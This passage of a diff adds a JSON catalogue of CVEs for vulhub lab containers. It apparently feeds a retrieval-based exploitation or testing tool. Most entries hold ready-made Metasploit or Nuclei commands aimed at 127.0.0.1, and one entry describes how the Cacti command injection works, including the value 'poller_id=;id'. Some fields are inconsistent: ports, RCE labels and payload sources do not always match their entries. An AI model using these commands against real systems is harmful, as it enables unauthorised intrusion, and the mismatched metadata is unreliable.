@@ -1,0 +1,842 @@
+[
+  {
+    "rag_summary": "漏洞 CVE-2024-39907 存在于 1panel 组件中，主要是因为：1Panel is a web-based linux server management control panel. 【验证步骤】：请使用 Nuclei 扫描工具，运行命令 `nuclei -t CVE-2024-39907.yaml -u http://<Target_IP>:10086`，该模板会自动检测目标是否存在此漏洞。",
+    "name": "CVE-2024-39907",
+    "path": "1panel/CVE-2024-39907",
+    "image": "vulhub/1panel/CVE-2024-39907",
+    "contracts": {
+      "ingress": [
+        10086
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "1Panel is a web-based linux server management control panel. There are many sql injections in the project, and some of them are not well filtered, leading to arbitrary file writes, and ultimately leading to RCEs. These sql injections have been resolved in version 1.10.12-tls. Users are advised to upgrade. There are no known workarounds for these issues.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "nuclei",
+      "module_path": "CVE-2024-39907.yaml",
+      "command_template": "nuclei -t {module_path} -u http://{target_ip}:{target_port}",
+      "command_example": "nuclei -t CVE-2024-39907.yaml -u http://127.0.0.1:10086",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    }
+  },
+  {
+    "name": "CVE-2016-3088",
+    "path": "activemq/CVE-2016-3088",
+    "image": "vulhub/activemq/CVE-2016-3088",
+    "contracts": {
+      "ingress": [
+        61616
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "The Fileserver web application in Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP MOVE request.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/multi/http/apache_activemq_upload_jsp",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/multi/http/apache_activemq_upload_jsp; set RHOSTS 127.0.0.1; set RPORT 61616; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2016-3088 存在于 activemq 组件中，主要是因为：The Fileserver web application in Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP MOVE request.. 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/multi/http/apache_activemq_upload_jsp` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 61616`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2021-21311",
+    "path": "adminer/CVE-2021-21311",
+    "image": "vulhub/adminer/CVE-2021-21311",
+    "contracts": {
+      "ingress": [
+        8080
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Adminer is an open-source database management in a single PHP file. In adminer from version 4.0.0 and before 4.7.9 there is a server-side request forgery vulnerability. Users of Adminer versions bundling all drivers (e.g. `adminer.php`) are affected. This is fixed in version 4.7.9.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "nuclei",
+      "module_path": "CVE-2021-21311.yaml",
+      "command_template": "nuclei -t {module_path} -u http://{target_ip}:{target_port}",
+      "command_example": "nuclei -t CVE-2021-21311.yaml -u http://127.0.0.1:8080",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2021-21311 存在于 adminer 组件中，主要是因为：Adminer is an open-source database management in a single PHP file. 【验证步骤】：请使用 Nuclei 扫描工具，运行命令 `nuclei -t CVE-2021-21311.yaml -u http://<Target_IP>:8080`，该模板会自动检测目标是否存在此漏洞。"
+  },
+  {
+    "name": "CVE-2020-11978",
+    "path": "airflow/CVE-2020-11978",
+    "image": "vulhub/airflow/CVE-2020-11978",
+    "contracts": {
+      "ingress": [
+        8080
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "An issue was found in Apache Airflow versions 1.10.10 and below. A remote code/command injection vulnerability was discovered in one of the example DAGs shipped with Airflow which would allow any authenticated user to run arbitrary commands as the user running airflow worker/scheduler (depending on the executor in use). If you already have examples disabled by setting load_examples=False in the config then you are not vulnerable.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/linux/http/apache_airflow_dag_rce",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/linux/http/apache_airflow_dag_rce; set RHOSTS 127.0.0.1; set RPORT 8080; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2020-11978 存在于 airflow 组件中，主要是因为：An issue was found in Apache Airflow versions 1.10.10 and below. 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/linux/http/apache_airflow_dag_rce` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8080`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2020-17526",
+    "path": "airflow/CVE-2020-17526",
+    "image": "vulhub/airflow/CVE-2020-17526",
+    "contracts": {
+      "ingress": [
+        8080
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Incorrect Session Validation in Apache Airflow Webserver versions prior to 1.10.14 with default config allows a malicious airflow user on site A where they log in normally, to access unauthorized Airflow Webserver on Site B through the session from Site A. This does not affect users who have changed the default value for `[webserver] secret_key` config.",
+      "exploit_effect": "Security impact exists but specific capability not automatically inferred from NVD data"
+    },
+    "poc_details": {
+      "type": "nuclei",
+      "module_path": "CVE-2020-17526.yaml",
+      "command_template": "nuclei -t {module_path} -u http://{target_ip}:{target_port}",
+      "command_example": "nuclei -t CVE-2020-17526.yaml -u http://127.0.0.1:8080",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2020-17526 存在于 airflow 组件中，主要是因为：Incorrect Session Validation in Apache Airflow Webserver versions prior to 1.10.14 with default config allows a malicious airflow user on site A where they log in normally, to access unauthorized A... 【验证步骤】：请使用 Nuclei 扫描工具，运行命令 `nuclei -t CVE-2020-17526.yaml -u http://<Target_IP>:8080`，该模板会自动检测目标是否存在此漏洞。"
+  },
+  {
+    "name": "CVE-2021-25646",
+    "path": "apache-druid/CVE-2021-25646",
+    "image": "vulhub/apache-druid/CVE-2021-25646",
+    "contracts": {
+      "ingress": [
+        8888
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Apache Druid includes the ability to execute user-provided JavaScript code embedded in various types of requests. This functionality is intended for use in high-trust environments, and is disabled by default. However, in Druid 0.20.0 and earlier, it is possible for an authenticated user to send a specially-crafted request that forces Druid to run user-provided JavaScript code for that request, regardless of server configuration. This can be leveraged to execute code on the target machine with the privileges of the Druid server process.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/linux/http/apache_druid_js_rce",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/linux/http/apache_druid_js_rce; set RHOSTS 127.0.0.1; set RPORT 8888; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2021-25646 存在于 apache-druid 组件中，主要是因为：Apache Druid includes the ability to execute user-provided JavaScript code embedded in various types of requests. 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/linux/http/apache_druid_js_rce` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8888`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2020-13945",
+    "path": "apisix/CVE-2020-13945",
+    "image": "vulhub/apisix/CVE-2020-13945",
+    "contracts": {
+      "ingress": [
+        9080
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "In Apache APISIX, the user enabled the Admin API and deleted the Admin API access IP restriction rules. Eventually, the default token is allowed to access APISIX management data. This affects versions 1.2, 1.3, 1.4, 1.5.",
+      "exploit_effect": "Security impact exists but specific capability not automatically inferred from NVD data"
+    },
+    "poc_details": {
+      "type": "nuclei",
+      "module_path": "CVE-2020-13945.yaml",
+      "command_template": "nuclei -t {module_path} -u http://{target_ip}:{target_port}",
+      "command_example": "nuclei -t CVE-2020-13945.yaml -u http://127.0.0.1:9080",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2020-13945 存在于 apisix 组件中，主要是因为：In Apache APISIX, the user enabled the Admin API and deleted the Admin API access IP restriction rules. 【验证步骤】：请使用 Nuclei 扫描工具，运行命令 `nuclei -t CVE-2020-13945.yaml -u http://<Target_IP>:9080`，该模板会自动检测目标是否存在此漏洞。"
+  },
+  {
+    "name": "CVE-2021-45232",
+    "path": "apisix/CVE-2021-45232",
+    "image": "vulhub/apisix/CVE-2021-45232",
+    "contracts": {
+      "ingress": [
+        9080
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "In Apache APISIX Dashboard before 2.10.1, the Manager API uses two frameworks and introduces framework `droplet` on the basis of framework `gin`, all APIs and authentication middleware are developed based on framework `droplet`, but some API directly use the interface of framework `gin` thus bypassing the authentication.",
+      "exploit_effect": "Bypass authentication or gain elevated privileges"
+    },
+    "poc_details": {
+      "type": "nuclei",
+      "module_path": "CVE-2021-45232.yaml",
+      "command_template": "nuclei -t {module_path} -u http://{target_ip}:{target_port}",
+      "command_example": "nuclei -t CVE-2021-45232.yaml -u http://127.0.0.1:9080",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "See Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2021-45232 存在于 apisix 组件中，主要是因为：In Apache APISIX Dashboard before 2.10.1, the Manager API uses two frameworks and introduces framework `droplet` on the basis of framework `gin`, all APIs and authentication middleware are develope... 【验证步骤】：请使用 Nuclei 扫描工具，运行命令 `nuclei -t CVE-2021-45232.yaml -u http://<Target_IP>:9080`，该模板会自动检测目标是否存在此漏洞。"
+  },
+  {
+    "name": "CVE-2018-8715",
+    "path": "appweb/CVE-2018-8715",
+    "image": "vulhub/appweb/CVE-2018-8715",
+    "contracts": {
+      "ingress": [
+        8080
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "The Embedthis HTTP library, and Appweb versions before 7.0.3, have a logic flaw related to the authCondition function in http/httpLib.c. With a forged HTTP request, it is possible to bypass authentication for the form and digest login types.",
+      "exploit_effect": "Bypass authentication or gain elevated privileges"
+    },
+    "poc_details": {
+      "type": "nuclei",
+      "module_path": "CVE-2018-8715.yaml",
+      "command_template": "nuclei -t {module_path} -u http://{target_ip}:{target_port}",
+      "command_example": "nuclei -t CVE-2018-8715.yaml -u http://127.0.0.1:8080",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2018-8715 存在于 appweb 组件中，主要是因为：The Embedthis HTTP library, and Appweb versions before 7.0.3, have a logic flaw related to the authCondition function in http/httpLib.c. 【验证步骤】：请使用 Nuclei 扫描工具，运行命令 `nuclei -t CVE-2018-8715.yaml -u http://<Target_IP>:8080`，该模板会自动检测目标是否存在此漏洞。"
+  },
+  {
+    "name": "CVE-2014-6271",
+    "path": "bash/CVE-2014-6271",
+    "image": "vulhub/bash/CVE-2014-6271",
+    "contracts": {
+      "ingress": [
+        8080
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka \"ShellShock.\"  NOTE: the original fix for this issue was incorrect; CVE-2014-7169 has been assigned to cover the vulnerability that is still present after the incorrect fix.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/linux/http/advantech_switch_bash_env_exec",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/linux/http/advantech_switch_bash_env_exec; set RHOSTS 127.0.0.1; set RPORT 8080; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "See MSF module"
+    },
+    "rag_summary": "漏洞 CVE-2014-6271 存在于 bash 组件中，主要是因为：GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment,... 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/linux/http/advantech_switch_bash_env_exec` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8080`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2022-46169",
+    "path": "cacti/CVE-2022-46169",
+    "image": "vulhub/cacti/CVE-2022-46169",
+    "contracts": {
+      "ingress": [
+        8080
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Cacti is an open source platform which provides a robust and extensible operational monitoring and fault management framework for users. In affected versions a command injection vulnerability allows an unauthenticated user to execute arbitrary code on a server running Cacti, if a specific data source was selected for any monitored device. The vulnerability resides in the `remote_agent.php` file. This file can be accessed without authentication. This function retrieves the IP address of the client via `get_client_addr` and resolves this IP address to the corresponding hostname via `gethostbyaddr`. After this, it is verified that an entry within the `poller` table exists, where the hostname corresponds to the resolved hostname. If such an entry was found, the function returns `true` and the client is authorized. This authorization can be bypassed due to the implementation of the `get_client_addr` function. The function is defined in the file `lib/functions.php` and checks serval `$_SERVER` variables to determine the IP address of the client. The variables beginning with `HTTP_` can be arbitrarily set by an attacker. Since there is a default entry in the `poller` table with the hostname of the server running Cacti, an attacker can bypass the authentication e.g. by providing the header `Forwarded-For: <TARGETIP>`. This way the function `get_client_addr` returns the IP address of the server running Cacti. The following call to `gethostbyaddr` will resolve this IP address to the hostname of the server, which will pass the `poller` hostname check because of the default entry. After the authorization of the `remote_agent.php` file is bypassed, an attacker can trigger different actions. One of these actions is called `polldata`. The called function `poll_for_data` retrieves a few request parameters and loads the corresponding `poller_item` entries from the database. If the `action` of a `poller_item` equals `POLLER_ACTION_SCRIPT_PHP`, the function `proc_open` is used to execute a PHP script. The attacker-controlled parameter `$poller_id` is retrieved via the function `get_nfilter_request_var`, which allows arbitrary strings. This variable is later inserted into the string passed to `proc_open`, which leads to a command injection vulnerability. By e.g. providing the `poller_id=;id` the `id` command is executed. In order to reach the vulnerable call, the attacker must provide a `host_id` and `local_data_id`, where the `action` of the corresponding `poller_item` is set to `POLLER_ACTION_SCRIPT_PHP`. Both of these ids (`host_id` and `local_data_id`) can easily be bruteforced. The only requirement is that a `poller_item` with an `POLLER_ACTION_SCRIPT_PHP` action exists. This is very likely on a productive instance because this action is added by some predefined templates like `Device - Uptime` or `Device - Polling Time`.\n\nThis command injection vulnerability allows an unauthenticated user to execute arbitrary commands if a `poller_item` with the `action` type `POLLER_ACTION_SCRIPT_PHP` (`2`) is configured. The authorization bypass should be prevented by not allowing an attacker to make `get_client_addr` (file `lib/functions.php`) return an arbitrary IP address. This could be done by not honoring the `HTTP_...` `$_SERVER` variables. If these should be kept for compatibility reasons it should at least be prevented to fake the IP address of the server running Cacti. This vulnerability has been addressed in both the 1.2.x and 1.3.x release branches with `1.2.23` being the first release containing the patch.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/linux/http/cacti_unauthenticated_cmd_injection",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/linux/http/cacti_unauthenticated_cmd_injection; set RHOSTS 127.0.0.1; set RPORT 8080; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2022-46169 存在于 cacti 组件中，主要是因为：Cacti is an open source platform which provides a robust and extensible operational monitoring and fault management framework for users. 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/linux/http/cacti_unauthenticated_cmd_injection` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8080`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2023-39361",
+    "path": "cacti/CVE-2023-39361",
+    "image": "vulhub/cacti/CVE-2023-39361",
+    "contracts": {
+      "ingress": [
+        8080
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Cacti is an open source operational monitoring and fault management framework. Affected versions are subject to a SQL injection discovered in graph_view.php. Since guest users can access graph_view.php without authentication by default, if guest users are being utilized in an enabled state, there could be the potential for significant damage. Attackers may exploit this vulnerability, and there may be possibilities for actions such as the usurpation of administrative privileges or remote code execution. This issue has been addressed in version 1.2.25. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "nuclei",
+      "module_path": "CVE-2023-39361.yaml",
+      "command_template": "nuclei -t {module_path} -u http://{target_ip}:{target_port}",
+      "command_example": "nuclei -t CVE-2023-39361.yaml -u http://127.0.0.1:8080",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2023-39361 存在于 cacti 组件中，主要是因为：Cacti is an open source operational monitoring and fault management framework. 【验证步骤】：请使用 Nuclei 扫描工具，运行命令 `nuclei -t CVE-2023-39361.yaml -u http://<Target_IP>:8080`，该模板会自动检测目标是否存在此漏洞。"
+  },
+  {
+    "name": "CVE-2010-2861",
+    "path": "coldfusion/CVE-2010-2861",
+    "image": "vulhub/coldfusion/CVE-2010-2861",
+    "contracts": {
+      "ingress": [
+        8500
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Multiple directory traversal vulnerabilities in the administrator console in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/administrator/settings/mappings.cfm, (2) logging/settings.cfm, (3) datasources/index.cfm, (4) j2eepackaging/editarchive.cfm, and (5) enter.cfm in CFIDE/administrator/.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "auxiliary/scanner/http/coldfusion_locale_traversal",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use auxiliary/scanner/http/coldfusion_locale_traversal; set RHOSTS 127.0.0.1; set RPORT 8500; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "See MSF module"
+    },
+    "rag_summary": "漏洞 CVE-2010-2861 存在于 coldfusion 组件中，主要是因为：Multiple directory traversal vulnerabilities in the administrator console in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/... 【验证步骤】：请打开 Metasploit 控制台，输入 `use auxiliary/scanner/http/coldfusion_locale_traversal` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8500`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2023-26360",
+    "path": "coldfusion/CVE-2023-26360",
+    "image": "vulhub/coldfusion/CVE-2023-26360",
+    "contracts": {
+      "ingress": [
+        8500
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Adobe ColdFusion versions 2018 Update 15 (and earlier) and 2021 Update 5 (and earlier) are affected by an Improper Access Control vulnerability that could result in arbitrary code execution in the context of the current user. Exploitation of this issue does not require user interaction.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/multi/http/adobe_coldfusion_rce_cve_2023_26360",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/multi/http/adobe_coldfusion_rce_cve_2023_26360; set RHOSTS 127.0.0.1; set RPORT 8500; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2023-26360 存在于 coldfusion 组件中，主要是因为：Adobe ColdFusion versions 2018 Update 15 (and earlier) and 2021 Update 5 (and earlier) are affected by an Improper Access Control vulnerability that could result in arbitrary code execution in the ... 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/multi/http/adobe_coldfusion_rce_cve_2023_26360` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8500`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2023-29300",
+    "path": "coldfusion/CVE-2023-29300",
+    "image": "vulhub/coldfusion/CVE-2023-29300",
+    "contracts": {
+      "ingress": [
+        8500
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Adobe ColdFusion versions 2018u16 (and earlier), 2021u6 (and earlier) and 2023.0.0.330468 (and earlier) are affected by a Deserialization of Untrusted Data vulnerability that could result in Arbitrary code execution. Exploitation of this issue does not require user interaction.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "nuclei",
+      "module_path": "CVE-2023-29300.yaml",
+      "command_template": "nuclei -t {module_path} -u http://{target_ip}:{target_port}",
+      "command_example": "nuclei -t CVE-2023-29300.yaml -u http://127.0.0.1:8500",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2023-29300 存在于 coldfusion 组件中，主要是因为：Adobe ColdFusion versions 2018u16 (and earlier), 2021u6 (and earlier) and 2023.0.0.330468 (and earlier) are affected by a Deserialization of Untrusted Data vulnerability that could result in Arbitr... 【验证步骤】：请使用 Nuclei 扫描工具，运行命令 `nuclei -t CVE-2023-29300.yaml -u http://<Target_IP>:8500`，该模板会自动检测目标是否存在此漏洞。"
+  },
+  {
+    "name": "CVE-2019-3396",
+    "path": "confluence/CVE-2019-3396",
+    "image": "vulhub/confluence/CVE-2019-3396",
+    "contracts": {
+      "ingress": [
+        8090
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "The Widget Connector macro in Atlassian Confluence Server before version 6.6.12 (the fixed version for 6.6.x), from version 6.7.0 before 6.12.3 (the fixed version for 6.12.x), from version 6.13.0 before 6.13.3 (the fixed version for 6.13.x), and from version 6.14.0 before 6.14.2 (the fixed version for 6.14.x), allows remote attackers to achieve path traversal and remote code execution on a Confluence Server or Data Center instance via server-side template injection.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/multi/http/confluence_widget_connector",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/multi/http/confluence_widget_connector; set RHOSTS 127.0.0.1; set RPORT 8090; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2019-3396 存在于 confluence 组件中，主要是因为：The Widget Connector macro in Atlassian Confluence Server before version 6.6.12 (the fixed version for 6.6.x), from version 6.7.0 before 6.12.3 (the fixed version for 6.12.x), from version 6.13.0 b... 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/multi/http/confluence_widget_connector` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8090`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2021-26084",
+    "path": "confluence/CVE-2021-26084",
+    "image": "vulhub/confluence/CVE-2021-26084",
+    "contracts": {
+      "ingress": [
+        8090
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0 before 7.12.5.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/multi/http/atlassian_confluence_webwork_ognl_injection",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/multi/http/atlassian_confluence_webwork_ognl_injection; set RHOSTS 127.0.0.1; set RPORT 8090; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "Raw HTTP Request extracted from Nuclei template"
+    },
+    "rag_summary": "漏洞 CVE-2021-26084 存在于 confluence 组件中，主要是因为：In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an unauthenticated attacker to execute arbitrary code on a Confluence Server or Da... 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/multi/http/atlassian_confluence_webwork_ognl_injection` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8090`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2022-26134",
+    "path": "confluence/CVE-2022-26134",
+    "image": "vulhub/confluence/CVE-2022-26134",
+    "contracts": {
+      "ingress": [
+        8090
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance. The affected versions are from 1.3.0 before 7.4.17, from 7.13.0 before 7.13.7, from 7.14.0 before 7.14.3, from 7.15.0 before 7.15.2, from 7.16.0 before 7.16.4, from 7.17.0 before 7.17.4, and from 7.18.0 before 7.18.1.",
+      "exploit_effect": "Execute arbitrary code on the target system"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/multi/http/atlassian_confluence_namespace_ognl_injection",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/multi/http/atlassian_confluence_namespace_ognl_injection; set RHOSTS 127.0.0.1; set RPORT 8090; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
+      "payload_example": "See MSF module"
+    },
+    "rag_summary": "漏洞 CVE-2022-26134 存在于 confluence 组件中，主要是因为：In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an unauthenticated attacker to execute arbitrary code on a Confluence Server or Da... 【验证步骤】：请打开 Metasploit 控制台，输入 `use exploits/multi/http/atlassian_confluence_namespace_ognl_injection` 加载模块，然后设置目标 IP `set RHOSTS <Target_IP>` 和端口 `set RPORT 8090`，最后输入 `run` 即可尝试攻击。"
+  },
+  {
+    "name": "CVE-2023-22515",
+    "path": "confluence/CVE-2023-22515",
+    "image": "vulhub/confluence/CVE-2023-22515",
+    "contracts": {
+      "ingress": [
+        8090
+      ],
+      "vuln_type": "rce"
+    },
+    "description": {
+      "exploit_method": "Atlassian has been made aware of an issue reported by a handful of customers where external attackers may have exploited a previously unknown vulnerability in publicly accessible Confluence Data Center and Server instances to create unauthorized Confluence administrator accounts and access Confluence instances. \r\n\r\nAtlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue. ",
+      "exploit_effect": "Security impact exists but specific capability not automatically inferred from NVD data"
+    },
+    "poc_details": {
+      "type": "msf",
+      "module_path": "exploits/multi/http/atlassian_confluence_rce_cve_2023_22515",
+      "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+      "command_example": "msfconsole -q -x 'use exploits/multi/http/atlassian_confluence_rce_cve_2023_22515; set RHOSTS 127.0.0.1; set RPORT 8090; run; exit'",
+      "required_params": [
+        "target_ip",
+        "target_port"
+      ],
+      "is_auth_required": false,
